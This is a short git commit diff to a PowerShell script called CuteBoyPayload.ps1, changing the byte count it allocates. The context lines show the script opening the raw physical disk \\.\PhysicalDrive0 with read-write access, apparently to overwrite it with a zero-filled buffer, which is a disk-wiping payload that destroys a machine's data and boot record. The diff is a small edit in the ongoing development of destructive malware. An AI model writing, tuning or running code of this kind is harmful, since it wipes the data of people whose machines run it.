6edbedf791ec5917e9738fa8e39c4ced95471d6a
Syed Shah <195543322+Syed930s@users.noreply.github.com>
2026-08-02 12:13:37 +0100

    Update disk size variable in CuteBoyPayload.ps1

--- CuteBoyPayload.ps1
+++ CuteBoyPayload.ps1
@@ -30,7 +30,7 @@ while ((Get-Date) -lt $end) {
 $g.Dispose()
 
 $disk = "\\.\PhysicalDrive0"
-$size = 1840960000
+$size = 540960000
 $bytes = New-Object byte[]($size)
 try {
     $stream = [System.IO.File]::Open($disk, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
